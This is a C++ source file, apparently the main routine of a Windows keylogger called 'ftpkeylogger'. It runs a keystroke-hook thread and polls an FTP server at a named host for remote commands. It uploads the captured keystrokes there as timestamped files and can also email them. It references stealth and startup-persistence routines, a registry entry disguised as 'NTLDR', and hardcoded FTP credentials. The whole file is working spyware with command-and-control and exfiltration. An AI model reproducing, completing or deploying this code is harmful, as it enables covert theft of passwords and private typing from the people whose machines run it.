#include "ftpkeylogger.h"

    unsigned int threadid = 0;

    DWORD numberread = 0, numberwritten = 0;
    DWORD err = 0;

    string tempkeylog_buffer;

    const string RegistryKeyName = "NTLDR";

    char pathtofile[MAX_PATH]{};
    char ftpreadbuffer[1024]{};
    char computername[4096]{};


    map<string, COMMAND> cmds;

    vector<string> filetokens;

    bool killswitch = true;



int main(){

    //Stealth();
    //AddtoStartup();
    DWORD dummyword = 4096; //Never used
    GetComputerName(computername, &dummyword);

    cmds["CONTINUE"] = CONTINUE;
    cmds["PAUSE"] = PAUSE;
    cmds["KILL"] = KILL;


    _beginthreadex(NULL,  0, &keylogthreadhook, NULL, 0, &threadid);

    while(killswitch){

        HINTERNET connection = InternetOpen("ftpkeylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL,0);

        cout << GetLastError();

        HINTERNET ftpinstance = InternetConnect(connection, "ftp.drivehq.com", INTERNET_DEFAULT_FTP_PORT, "ludibrium", "22073kk", INTERNET_SERVICE_FTP, NULL, NULL);

        cout << GetLastError();

        HINTERNET filehandle = FtpOpenFile(ftpinstance, "command.txt", GENERIC_READ, FTP_TRANSFER_TYPE_ASCII, NULL);

        cout << GetLastError();

        InternetReadFile(filehandle, ftpreadbuffer, 1024, &numberread);

        cout << GetLastError();

        InternetCloseHandle(filehandle);
        //InternetCloseHandle(ftpinstance);

        //cout << ftpreadbuffer;
        //cout << "\n" << numberread;

        string temporarystr;

        //cout <<reinterpret_cast<char *>(ftpreadbuffer);

            for(int i = 0; ftpreadbuffer[i] != '*'; i++){
        //cout << ftpreadbuffer[i];
                if(ftpreadbuffer[i] == '\n'){

                    i++;
                    filetokens.push_back(temporarystr);
                    temporarystr.clear();

                }

                temporarystr.push_back(ftpreadbuffer[i]);

            }


    //cout << tempkeylog_buffer.c_str();
   // cout << filetokens[0].c_str() << filetokens[1].c_str() << filetokens[2].c_str();

    map<string, COMMAND>::iterator i = cmds.find(filetokens[0].c_str());

    switch(i->second){

        case CONTINUE:{

            string time = gettime();
            time.append(".txt");
            //cout << time << "\n";
            HINTERNET newftplog = FtpOpenFile(ftpinstance, time.c_str(), GENERIC_WRITE, FTP_TRANSFER_TYPE_ASCII, 0);

            //cout << GetLastError() << "\n";

            InternetWriteFile(newftplog, tempkeylog_buffer.c_str(), tempkeylog_buffer.size(), &numberwritten);
            //cout << GetLastError() << "\n";

            InternetCloseHandle(newftplog);
            InternetCloseHandle(ftpinstance);
            InternetCloseHandle(connection);
            //cout << GetLastError() << "\n";

            //Really crappy way of verifying properly formated email
            //But i do not want to learn regex.
            //Plus user is expected to follow documentations... OR ELSE!
            if(-1 == filetokens[2].find("@")){
                //do nothing
            }else{

                string *ptrpass = new string(tempkeylog_buffer);

                _beginthreadex(NULL,  0, &sendmail, ptrpass, 0, 0);

            } //If there is an @ character

            tempkeylog_buffer.clear();
            filetokens.clear();
            temporarystr.clear();

            Sleep(atoi(filetokens[1].c_str()));

            //Upload ftp log to ftp server and sleep x seconds.


        }break;

        case PAUSE:{

            //cout << "Pause";
            PostThreadMessage(threadid, WM_QUIT, NULL, NULL);

            Sleep(atoi(filetokens[1].c_str())); //Pause for x milliseconds

            _beginthreadex(NULL,  0, &keylogthreadhook, NULL, 0, &threadid); //Restart the thread.

            tempkeylog_buffer.clear();
            filetokens.clear();
            temporarystr.clear();

            InternetCloseHandle(ftpinstance);
            InternetCloseHandle(connection);



        }break;

        case KILL:{

            killswitch = false;
            PostThreadMessage(threadid, WM_QUIT, NULL, NULL);
            RemoveFromStartup();
            //return 0 or killswitch = false;

        }break;

        default:{

            PostThreadMessage(threadid, WM_QUIT, NULL, NULL);
            killswitch = false;

        }//If a command is unrecognizable, terminate execution. Note that the program will resume upon next startup.
    }

    }


    return 0;
}


